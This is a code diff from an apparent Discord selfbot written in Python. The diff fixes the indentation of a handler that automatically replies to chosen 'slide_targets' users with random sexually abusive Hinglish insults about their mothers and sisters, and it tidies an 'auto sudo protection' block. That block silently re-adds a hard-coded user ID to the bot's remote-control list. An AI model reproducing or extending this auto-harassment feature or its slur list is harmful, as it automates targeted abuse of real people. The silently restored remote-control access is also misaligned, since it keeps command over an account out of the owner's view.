@@ -149,31 +149,30 @@ async def on_message(message):
         return
 
     # ==================== SLIDE TARGETS ====================
-if message.author.id in slide_targets:
-    await message.reply(random.choice([
-        "𝐓ᴇ𝐑ɪ 𝐁ʜ𝐍 𝐃ɪ 𝐂ʜᴏ𝐋ɪ 𝐌ᴇ 𝐊ʜᴇ𝐋𝐔 𝐇ᴏ𝐋ɪ ❤️‍🔥",
-        "𝐇ᴀs 𝐌ᴀ𝐓 𝐂ʜᴀ𝐋 𝐑ᴀɴᴅɪ𝐊ᴇ 𝐔ᴛʜᴀ𝐊 𝐁ᴇ𝐓ʜᴀ𝐊 𝐋ᴀɢ𝐀 😁🔥😤",
-        "𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀʀᴀ𝐍 𝐀ᴜᴊ𝐋ᴀ 𝐊ᴇ 𝐆ᴀɴ𝐄 𝐏ᴇ 𝐂ᴏᴅᴜɴɢ𝐀 𝐌ᴀʜᴏ𝐋 𝐏ᴜʀ𝐀 𝐖ᴀᴠʏ 🎶😂👌🏻😂👌😄👌",
-        "ꪶ 𝐋ɴᴅ 𝐂ʜᴜ𝐒 ꪻ♡︎ 💏‍️",
-        "■■■■■ 100% 𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀ 𝐆ᴜʟᴀʙʜ𝐈 𝐁ʜᴏsᴅ𝐀 𝐇ᴀᴄ𝐊 𝐊ᴀʀʟɪʏ𝐀 🗿👍",
-        "𝐒ᴜʙʜ𝐀 𝐇ᴏ 𝐘ᴀ 𝐒ʜᴀ𝐌 𝐂ʜᴜᴅ𝐓ᴇ 𝐑ʜᴇ𝐍𝐀 𝐇ᴀ𝐈 𝐓ᴇ𝐑ᴀ 𝐊ᴀᴀ𝐌 😂🔥😂🔥",
-        "𝐂ʜᴜ𝐏 𝐓ᴇʀɪ 𝐌ᴀ 𝐊ᴀ 𝐁ʜᴏ𝐒ᴅᴀ 🤢👟",
-        "⋆⭒˚.⋆🔭 𝐒ʜᴜ𝐓 𝐔ᴘ 𝐑ᴀɴᴅɪᴋ𝐄 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜ𝐃ᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜ𝐀 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ ⋆⭒˚.⋆🔭",
-        "𝐅ʏ𝐓s 𝐊ᴀʀɴ𝐄 𝐒ᴇ 𝐓ᴇ𝐑ɪ 𝐑ɴᴅ𝐘 𝐌ᴀ𝐀 अच्छी औरत नहीं बन जाएगी 🤮🤮🤮🤮🤣🤣😡",
-        "𝐀ʀᴇ 𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀ 𝐁ʜᴏ𝐒ᴅᴀ 🤢᭄᭄᭄ 🌟 𝐋ᴜɴ𝐃 𝐂ʜᴜ𝐒 🤪᭄᭄"
-    ]))
+    if message.author.id in slide_targets:
+        await message.reply(random.choice([
+            "𝐓ᴇ𝐑ɪ 𝐁ʜ𝐍 𝐃ɪ 𝐂ʜᴏ𝐋ɪ 𝐌ᴇ 𝐊ʜᴇ𝐋𝐔 𝐇ᴏ𝐋ɪ ❤️‍🔥",
+            "𝐇ᴀs 𝐌ᴀ𝐓 𝐂ʜᴀ𝐋 𝐑ᴀɴᴅɪ𝐊ᴇ 𝐔ᴛʜᴀ𝐊 𝐁ᴇ𝐓ʜᴀ𝐊 𝐋ᴀɢ𝐀 😁🔥😤",
+            "𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀʀᴀ𝐍 𝐀ᴜᴊ𝐋ᴀ 𝐊ᴇ 𝐆ᴀɴ𝐄 𝐏ᴇ 𝐂ᴏᴅᴜɴɢ𝐀 𝐌ᴀʜᴏ𝐋 𝐏ᴜʀ𝐀 𝐖ᴀᴠʏ 🎶😂👌🏻😂👌😄👌",
+            "ꪶ 𝐋ɴᴅ 𝐂ʜᴜ𝐒 ꪻ♡︎ 💏‍️",
+            "■■■■■ 100% 𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀ 𝐆ᴜʟᴀʙʜ𝐈 𝐁ʜᴏsᴅ𝐀 𝐇ᴀᴄ𝐊 𝐊ᴀʀʟɪʏ𝐀 🗿👍",
+            "𝐒ᴜʙʜ𝐀 𝐇ᴏ 𝐘ᴀ 𝐒ʜᴀ𝐌 𝐂ʜᴜᴅ𝐓ᴇ 𝐑ʜᴇ𝐍𝐀 𝐇ᴀ𝐈 𝐓ᴇ𝐑ᴀ 𝐊ᴀᴀ𝐌 😂🔥😂🔥",
+            "𝐂ʜᴜ𝐏 𝐓ᴇʀɪ 𝐌ᴀ 𝐊ᴀ 𝐁ʜᴏ𝐒ᴅᴀ 🤢👟",
+            "⋆⭒˚.⋆🔭 𝐒ʜᴜ𝐓 𝐔ᴘ 𝐑ᴀɴᴅɪᴋ𝐄 𝐓ᴇʀɪ 𝐌ᴀᴀ 𝐊ɪ 𝐂ʜᴜ𝐃ᴀɪ 𝐄ɴᴊᴏʏ 𝐊ʀ 𝐑ᴀʜ𝐀 𝐓ᴇʟᴇ𝐒ᴄᴏᴘᴇ 𝐒ᴇ ⋆⭒˚.⋆🔭",
+            "𝐅ʏ𝐓s 𝐊ᴀʀɴ𝐄 𝐒ᴇ 𝐓ᴇ𝐑ɪ 𝐑ɴᴅ𝐘 𝐌ᴀ𝐀 अच्छी औरत नहीं बन जाएगी 🤮🤮🤮🤮🤣🤣😡",
+            "𝐀ʀᴇ 𝐓ᴇ𝐑ɪ 𝐌ᴀ𝐀 𝐊ᴀ 𝐁ʜᴏ𝐒ᴅᴀ 🤢᭄᭄᭄ 🌟 𝐋ᴜɴ𝐃 𝐂ʜᴜ𝐒 🤪᭄᭄"
+        ]))
 
     # ==================== AUTO SUDO PROTECTION ====================
-    PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID yahan daal do
+    PROTECTED_USER_ID = 1480856249078907004
 
-    # Agar protected user ka message ho aur sudo mein na ho to wapas add kar do
     if message.author.id == PROTECTED_USER_ID:
         if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
             config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
             save_config(config)
             print(f"[PROTECT] {message.author} ko wapas sudo add kar diya")
 
-    # ==================== TUMHARA PURANA CODE ====================
+    # ==================== REST OF YOUR CODE ====================
     if message.author.id in config["copycat"]["users"]:
         if message.content.startswith(config['prefix']):
             response_message = message.content[len(config['prefix']):]
